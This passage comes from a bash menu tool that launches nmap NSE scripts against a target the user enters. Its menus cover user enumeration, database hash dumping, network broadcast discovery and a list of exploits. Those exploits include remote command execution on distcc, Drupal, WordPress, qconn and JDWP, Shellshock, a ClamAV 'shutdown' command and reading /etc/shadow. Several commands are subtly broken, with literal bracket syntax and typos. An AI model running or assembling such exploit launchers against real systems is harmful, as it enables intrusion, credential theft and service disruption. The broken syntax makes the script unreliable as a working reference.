          $xterm -p 2050 $ip --script domcon-cmd --script-args domcon-cmd.cmd="show server" domcon-cmd.user="$user",domcon-cmd.pass="$pass" &
        elif test $win == '4'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script domino-enum-users -p 1352 $ip &
        elif test $win == '5'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV -sC $ip &
        elif test $win == '6'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-auth [--script-args http-auth.path=/login] -p80 $ip &
        elif test $win == '7'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target " ; tput sgr0
          read port
          $xterm --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p $port $ip &
        elif test $win == '8'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=http-config-backup $ip &
        elif test $win == '9'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-default-accounts $ip &
        elif test $win == '10'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What the username: " ; tput sgr0
          read user
          echo -ne $okegreen " What the password: " ; tput sgr0
          read pass
          $xterm  --script domino-enum-passwords -p 80 $ip --script-args domino-enum-passwords.username=$user,domino-enum-passwords.password=$pass &
        elif test $win == '11'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' $ip &
        elif test $win == '12'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=http-userdir-enum $ip  &
        elif test $win == '13'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' $ip &
        elif test $win == '14'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-wordpress-users --script-args limit=50 $ip &
        elif test $win == '15'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " The username used for authentication: " ; tput sgr0
          read user
          echo -ne $okegreen " The password used for authentication : " ; tput sgr0
          read pass
          $xterm -p 9088 $ip --script informix-query --script-args informix-query.username=$user,informix-query.password=$pass &
        elif test $win == '16'
        then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " The username used for authentication: " ; tput sgr0
          read user
          echo -ne $okegreen " The password used for authentication : " ; tput sgr0
          read pass
          $xterm -p 9088 $ip --script informix-tables --script-args informix-tables.username=$user,informix-tables.password=$pass &
        elif test $win == '17'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 88 $ip --script krb5-enum-users --script-args krb5-enum-users.realm='test' &
        elif test $win == '18'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 1433 $ip --script ms-sql-dump-hashes &
        elif test $win == '19'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm -p $port --script ms-sql-empty-password --script-args mssql.instance-all $ip &
        elif test $win == '20'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " The username used for authentication: " ; tput sgr0
          read user
          echo -ne $okegreen " The password used for authentication : " ; tput sgr0
          read pass
          $xterm -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=$user,mssql.password=$pass $ip &
        elif test $win == '21'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " The username to use to connect to the server " ; tput sgr0
          read user
          echo -ne $okegreen " The password to use to connect to the server: " ; tput sgr0
          read pass
          $xterm -p 3306 $ip --script mysql-dump-hashes --script-args="username=$user,password=$pass" &
        elif test $win == '22'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=mysql-empty-password $ip &
        elif test $win == '23'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " The username to use to connect to the server (Optional):" ; tput sgr0
          read user
          echo -ne $okegreen " The password to use to connect to the server (Optional): " ; tput sgr0
          read pass
          echo -ne $okegreen " The query for which to return the results " ; tput sgr0
          read query
          $xterm -p 3306 $ip --script mysql-query --script-args="query="$query"[,username=$username,password=$pass]" &
        elif test $win == '24'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=mysql-users $ip &
        elif test $win == '25'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=ncp-enum-users $ip &
        elif test $win == '26'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 12345 --script netbus-auth-bypass $ip &
        elif test $win == '27'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 $ip &
        elif test $win == '28'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV -sC $ip &
        elif test $win == '29'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=sip-enum-users -sU -p 5060 $ip &
        elif test $win == '30'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -script smb-enum-users.nse -p 445 $ip &
        elif test $win == '31'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587 $ip &
        elif test $win == '32'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sU -p 161 --script=snmp-win32-users $ip &
        elif test $win == '33'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --sV -sC $ip &
        elif test $win == '34'
          then
           nse
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            menu
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            auth
        fi
}

function brd () {
clear
  echo
  echo
  echo -e $white"	[$okegreen"01"$white]$cyan broadcast-ataoe-discover	"
  echo -e $white"	[$okegreen"02"$white]$cyan broadcast-avahi-dos	"
  echo -e $white"	[$okegreen"03"$white]$cyan broadcast-bjnp-discover "
  echo -e $white"	[$okegreen"04"$white]$cyan broadcast-db2-discover	"
  echo -e $white"	[$okegreen"05"$white]$cyan broadcast-dhcp-discover	"
  echo -e $white"	[$okegreen"06"$white]$cyan broadcast-dhcp6-discover	"
  echo -e $white"	[$okegreen"07"$white]$cyan broadcast-dns-service-discovery	"
  echo -e $white"	[$okegreen"08"$white]$cyan broadcast-dropbox-listener	"
  echo -e $white"	[$okegreen"09"$white]$cyan broadcast-eigrp-discovery	"
  echo -e $white"	[$okegreen"10"$white]$cyan broadcast-igmp-discovery	"
  echo -e $white"	[$okegreen"11"$white]$cyan broadcast-listener	"
  echo -e $white"	[$okegreen"12"$white]$cyan broadcast-ms-sql-discover	"
  echo -e $white"	[$okegreen"13"$white]$cyan broadcast-netbios-master-browser	"
  echo -e $white"	[$okegreen"14"$white]$cyan broadcast-networker-discover	"
  echo -e $white"	[$okegreen"15"$white]$cyan broadcast-novell-locate	"
  echo -e $white"	[$okegreen"16"$white]$cyan broadcast-pc-anywhere	"
  echo -e $white"	[$okegreen"17"$white]$cyan broadcast-pc-duo	"
  echo -e $white"	[$okegreen"18"$white]$cyan broadcast-pim-discovery	"
  echo -e $white"	[$okegreen"19"$white]$cyan broadcast-ping	"
  echo -e $white"	[$okegreen"20"$white]$cyan broadcast-pppoe-discover	"
  echo -e $white"	[$okegreen"21"$white]$cyan broadcast-rip-discover	"
  echo -e $white"	[$okegreen"22"$white]$cyan broadcast-ripng-discover	"
  echo -e $white"	[$okegreen"23"$white]$cyan broadcast-sonicwall-discover	"
  echo -e $white"	[$okegreen"24"$white]$cyan broadcast-sybase-asa-discover	"
  echo -e $white"	[$okegreen"25"$white]$cyan broadcast-tellstick-discover	"
  echo -e $white"	[$okegreen"26"$white]$cyan broadcast-upnp-info	"
  echo -e $white"	[$okegreen"27"$white]$cyan broadcast-versant-locate	"
  echo -e $white"	[$okegreen"28"$white]$cyan broadcast-wake-on-lan	"
  echo -e $white"	[$okegreen"29"$white]$cyan broadcast-wpad-discover	"
  echo -e $white"	[$okegreen"30"$white]$cyan broadcast-wsdd-discover	"
  echo -e $white"	[$okegreen"31"$white]$cyan broadcast-xdmcp-discover	"
  echo -e $white"	[$okegreen"32"$white]$cyan eap-info	"
  echo -e $white"	[$okegreen"33"$white]$cyan ipv6-multicast-mld-list	"
  echo -e $white"	[$okegreen"34"$white]$cyan knx-gateway-discover	"
  echo -e $white"	[$okegreen"35"$white]$cyan llmnr-resolve	"
  echo -e $white"	[$okegreen"36"$white]$cyan lltd-discovery	"
  echo -e $white"	[$okegreen"37"$white]$cyan mrinfo	"
  echo -e $white"	[$okegreen"38"$white]$cyan mtrace	"
  echo -e $white"	[$okegreen"39"$white]$cyan targets-ipv6-multicast-echo	"
  echo -e $white"	[$okegreen"40"$white]$cyan targets-ipv6-multicast-invalid-dst	"
  echo -e $white"	[$okegreen"41"$white]$cyan targets-ipv6-multicast-mld	"
  echo -e $white"	[$okegreen"42"$white]$cyan targets-ipv6-multicast-slaac	"
  echo -e $white"	[$okegreen"43"$white]$cyan targets-sniffer	"
  echo -e $white"	[$okegreen"44"$white]$cyan back	"
  echo -n -e $red'  \033[4mScreetsec@nse-broadcast:\033[0m>> '; tput sgr0 #insert your choice
        read min
        if test $min == '1'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-ataoe-discover -e $ie &
        elif test $min == '2'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=broadcast-avahi-dos -e $ie &
        elif test $min == '3'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-bjnp-discover -e $ie &
        elif test $min == '4'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script db2-discover -e $ie &
        elif test $min == '5'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-dhcp-discover -e $ie &
        elif test $min == '6'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm -6 --script broadcast-dhcp6-discover -e $ie &
        elif test $min == '7'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=broadcast-dns-service-discovery -e $ie &
        elif test $min == '8'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=broadcast-dropbox-listener --script-args=newtargets -Pn -e $ie &
        elif test $min == '9'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=broadcast-eigrp-discovery $ip -e $ie &
        elif test $min == '10'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-igmp-discovery -e $ie &
        elif test $min == '11'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-listener -e $ie &
        elif test $min == '12'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm nmap --script broadcast-ms-sql-discover -e $ie &
        elif test $min == '13'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=broadcast-netbios-master-browser -e $ie &
        elif test $min == '14'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-networker-discover -e $ie &
        elif test $min == '15'
          then
          echo
          echo -ne $okegreen " What is your Targets" ; tput sgr0
          read ie
          $xterm -sV --script=broadcast-novell-locate $ie &
        elif test $min == '16'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm  --script broadcast-pc-anywhere -e $ie &
        elif test $min == '17'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-pc-duo -e $ie &
        elif test $min == '18'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm nmap --script broadcast-pim-discovery -e $ie &
        elif test $min == '19'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          echo -ne $okegreen " Default value for TTL is 64 & the length of the payload is 0" ; tput sgr0
          read ttl
          echo -ne $okegreen " The payload is consisted of random bytes." ; tput sgr0
          read payload
          echo -ne $okegreen " Timespec specifying how long to wait for response (default 3s)" ; tput sgr0
          read ti
          echo -ne $okegreen " Number specifying how many ICMP probes should be sent (default 1)" ; tput sgr0
          read np
          $xterm -e $ie [--ttl $ttl] [--data-length $payload] --script broadcast-ping [--script-args [broadcast-ping.timeout=$ti],[num-probes=$np]]] &
        elif test $min == '20'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-pppoe-discover -e $ie &
        elif test $min == '21'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-rip-discover -e $ie &
        elif test $min == '22'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-ripng-discover -e $ie &
        elif test $min == '23'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm -e $ie --script broadcast-sonicwall-discover &
        elif test $min == '24'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-sybase-asa-discover -e $ie &
        elif test $min == '25'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-tellstick-discover -e $ie &
        elif test $min == '26'
          then
          echo
          echo -ne $okegreen " What is your Targets" ; tput sgr0
          read ip
          $xterm -sV --script=broadcast-upnp-info $ip &
        elif test $min == '27'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-versant-locate -e $ie &
        elif test $min == '28'
          then
          echo
          echo -ne $okegreen " The MAC address of the remote system to wake up" ; tput sgr0
          read mac
          $xterm --script broadcast-wake-on-lan --script-args broadcast-wake-on-lan.MAC="$mac" &
        elif test $min == '29'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-wpad-discover -e $ie &
        elif test $min == '30'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-wsdd-discover -e $ie &
        elif test $min == '31'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script broadcast-xdmcp-discover -e $ie &
        elif test $min == '32'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -e interface --script eap-info [--script-args="eap-info.identity=0-user,eap-info.scan={13,50}"] $ip &
        elif test $min == '33'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=ipv6-multicast-mld-list -e $ie &
        elif test $min == '34'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script knx-gateway-discover -e $ie &
        elif test $min == '35'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          echo -ne $okegreen " Hostname to resolve : " ; tput sgr0
          read hostname
          $xterm --script llmnr-resolve --script-args "llmnr-resolve.hostname=$hostname" -e $ie &
        elif test $min == '36'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm -e $ie --script lltd-discovery &
        elif test $min == '37'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script mrinfo -e $ie &
        elif test $min == '38'
          then
          echo
          echo -ne $okegreen " Source address from which to traceroute." ; tput sgr0
          read rt
          $xterm --script mtrace --script-args "mtrace.fromip=$rt" &
        elif test $min == '39'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=targets-ipv6-multicast-echo.nse --script-args "newtargets,interface=$ie" -sL &
        elif test $min == '40'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=targets-ipv6-multicast-invalid-dst.nse --script-args "newtargets,interface=$ie" -sP &
        elif test $min == '41'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script=targets-ipv6-multicast-mld.nse --script-args "newtargets,interface=$ie" &
        elif test $min == '42'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm --script targets-ipv6-multicast-slaac --script-args "newtargets,interface=$ie" -sP &
        elif test $min == '43'
          then
          echo
          echo -ne $okegreen " What is your Interfaces" ; tput sgr0
          read ie
          $xterm -sL --script=targets-sniffer --script-args=newtargets,targets-sniffer.timeout=5s,targets-sniffer.iface=$ie &
        elif test $min == '44'
          then
           nse
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            menu
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            brd
        fi
}

function exploit () {
clear
  echo
  echo
  echo -e $white"	[$okegreen"01"$white]$cyan afp-path-vuln "
  echo -e $white"	[$okegreen"02"$white]$cyan clamav-exec   "
  echo -e $white"	[$okegreen"03"$white]$cyan distcc-cve2004-2687  "
  echo -e $white"	[$okegreen"04"$white]$cyan ftp-proftpd-backdoor "
  echo -e $white"	[$okegreen"05"$white]$cyan ftp-vsftpd-backdoor "
  echo -e $white"	[$okegreen"06"$white]$cyan http-adobe-coldfusion-apsa1301 "
  echo -e $white"	[$okegreen"07"$white]$cyan http-avaya-ipoffice-users "
  echo -e $white"	[$okegreen"08"$white]$cyan http-awstatstotals-exec "
  echo -e $white"	[$okegreen"09"$white]$cyan http-axis2-dir-traversal "
  echo -e $white"	[$okegreen"10"$white]$cyan http-barracuda-dir-traversal "
  echo -e $white"	[$okegreen"11"$white]$cyan http-coldfusion-subzero "
  echo -e $white"	[$okegreen"12"$white]$cyan http-csrf "
  echo -e $white"	[$okegreen"13"$white]$cyan http-dlink-backdoor "
  echo -e $white"	[$okegreen"14"$white]$cyan http-dombased-xss "
  echo -e $white"	[$okegreen"15"$white]$cyan http-fileupload-exploiter "
  echo -e $white"	[$okegreen"16"$white]$cyan http-huawei-hg5xx-vuln "
  echo -e $white"	[$okegreen"17"$white]$cyan http-litespeed-sourcecode-download "
  echo -e $white"	[$okegreen"18"$white]$cyan http-majordomo2-dir-traversal "
  echo -e $white"	[$okegreen"19"$white]$cyan http-phpmyadmin-dir-traversal "
  echo -e $white"	[$okegreen"20"$white]$cyan http-shellshock "
  echo -e $white"	[$okegreen"21"$white]$cyan http-stored-xss "
  echo -e $white"	[$okegreen"22"$white]$cyan http-tplink-dir-traversal "
  echo -e $white"	[$okegreen"23"$white]$cyan http-vuln-cve2006-3392 "
  echo -e $white"	[$okegreen"24"$white]$cyan http-vuln-cve2009-3960 "
  echo -e $white"	[$okegreen"25"$white]$cyan http-vuln-cve2012-1823 "
  echo -e $white"	[$okegreen"26"$white]$cyan http-vuln-cve2013-0156 "
  echo -e $white"	[$okegreen"27"$white]$cyan http-vuln-cve2013-6786 "
  echo -e $white"	[$okegreen"28"$white]$cyan http-vuln-cve2013-7091 "
  echo -e $white"	[$okegreen"29"$white]$cyan http-vuln-cve2014-3704 "
  echo -e $white"	[$okegreen"30"$white]$cyan http-vuln-cve2014-8877 "
  echo -e $white"	[$okegreen"31"$white]$cyan http-vuln-wnr1000-creds "
  echo -e $white"	[$okegreen"32"$white]$cyan irc-unrealircd-backdoor "
  echo -e $white"	[$okegreen"33"$white]$cyan jdwp-exec "
  echo -e $white"	[$okegreen"34"$white]$cyan jdwp-inject "
  echo -e $white"	[$okegreen"35"$white]$cyan qconn-exec "
  echo -e $white"	[$okegreen"36"$white]$cyan smb-vuln-conficker "
  echo -e $white"	[$okegreen"37"$white]$cyan smb-vuln-cve2009-3103 "
  echo -e $white"	[$okegreen"38"$white]$cyan smb-vuln-ms06-025 "
  echo -e $white"	[$okegreen"39"$white]$cyan smb-vuln-ms07-029 "
  echo -e $white"	[$okegreen"40"$white]$cyan smb-vuln-ms08-067 "
  echo -e $white"	[$okegreen"41"$white]$cyan smb-vuln-regsvc-dos "
  echo -e $white"	[$okegreen"42"$white]$cyan smtp-vuln-cve2010-4344 "
  echo -e $white"	[$okegreen"43"$white]$cyan supermicro-ipmi-conf "
  echo -e $white"	[$okegreen"44"$white]$cyan back "
  echo -e " "
  echo -n -e $red'  \033[4mScreetsec@nse-exploit:\033[0m>> '; tput sgr0 #insert your choice
           read cin
        if test $cin == '1'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=afp-path-vuln $ip &
        elif test $cin == '2'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script clamav-exec --script-args cmd='shutdown' $ip &
        elif test $cin == '3'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 3632 $ip --script distcc-exec --script-args="distcc-exec.cmd='id'" &
        elif test $cin == '4'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script ftp-proftpd-backdoor -p 21 $ip &
        elif test $cin == '5'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script ftp-vsftpd-backdoor -p 21 $ip &
        elif test $cin == '6'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $ip &
        elif test $cin == '7'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-avaya-ipoffice-users $ip &
        elif test $cin == '8'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $ip &
        elif test $cin == '9'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-axis2-dir-traversal $ip &
        elif test $cin == '10'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p $port $ip &
        elif test $cin == '11'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-coldfusion-subzero --script-args basepath=/cf/ $ip &
        elif test $cin == '12'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-csrf.nse $ip &
        elif test $cin == '13'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-dlink-backdoor $ip &
        elif test $cin == '14'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-dombased-xss.nse $ip &
        elif test $cin == '15'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-fileupload-exploiter.nse $ip &
        elif test $cin == '16'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-huawei-hg5xx-vuln $ip &
        elif test $cin == '17'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $ip &
        elif test $cin == '18'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-majordomo2-dir-traversal $ip &
        elif test $cin == '19'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-phpmyadmin-dir-traversal $ip &
        elif test $cin == '20'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $ip &
        elif test $cin == '21'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-stored-xss.nse $ip &
        elif test $cin == '22'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn $ip &
        elif test $cin == '23'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $ip &
        elif test $cin == '24'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $ip &
        elif test $cin == '25'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-cve2012-1823 $ip &
        elif test $cin == '26'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-cve2013-0156 $ip &
        elif test $cin == '27'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV http-rompager-xss $ip &
        elif test $cin == '28'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $ip &
        elif test $cin == '29'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $ip &
        elif test $cin == '30'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $ip &
        elif test $cin == '31'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script http-vuln-wnr1000-creds $ip -p 80 &
        elif test $cin == '32'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=irc-unrealircd-backdoor $ip &
        elif test $cin == '33'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm -sT $ip -p $port --script=+jdwp-exec --script-args cmd="date" &
        elif test $cin == '34'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm -sT $ip -p $port --script=+jdwp-inject --script-args filename=HelloWorld.class &
        elif test $cin == '35'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
          read port
          $xterm --script qconn-exec --script-args qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" -p $port $ip &
        elif test $cin == '36'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-conficker.nse -p 445 $ip &
        elif test $cin == '37'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
